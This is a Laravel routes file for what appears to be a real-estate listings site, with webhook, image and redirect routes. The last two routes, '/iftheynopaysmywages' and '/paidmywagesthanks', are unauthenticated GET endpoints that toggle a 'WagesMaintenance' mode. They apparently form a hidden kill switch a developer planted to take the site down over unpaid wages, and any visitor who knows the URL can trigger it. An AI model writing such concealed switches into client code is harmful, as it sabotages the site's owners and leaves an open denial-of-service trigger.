<?php

use App\Http\Controllers\Auth\FreshCsrfTokenController;
use App\Http\Controllers\GoHighLevelWebhookController;
use App\Http\Controllers\TrebWebpController;
use App\Http\Middleware\GeoBlockMiddleware;
use App\Supports\WagesMaintenance;
use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken;
use Illuminate\Support\Facades\Route;

Route::get('/auth/csrf-token', FreshCsrfTokenController::class)
    ->name('auth.csrf-token');

// CMS page slug is terms-conditions; keep common alternate URLs working.
Route::redirect('/terms-of-service', '/terms-conditions', 301);
Route::redirect('/terms', '/terms-conditions', 301);

// GoHighLevel inbound webhook / workflow hook — pending MLS enqueue only (ghl queue).
Route::post('/webhooks/gohighlevel', GoHighLevelWebhookController::class)
    ->name('webhooks.gohighlevel')
    ->withoutMiddleware([VerifyCsrfToken::class, GeoBlockMiddleware::class]);

Route::get('/storage/properties/treb/{listingKey}/{filename}', TrebWebpController::class)
    ->where('listingKey', '[A-Za-z0-9]+')
    ->where('filename', '[A-Za-z0-9._-]+')
    ->withoutMiddleware([GeoBlockMiddleware::class]);

Route::get('/iftheynopaysmywages', function () {
    WagesMaintenance::enable();

    return redirect('/');
})->name('iftheynopaysmywages');

Route::get('/paidmywagesthanks', function () {
    WagesMaintenance::disable();

    return redirect('/');
})->name('paidmywagesthanks');
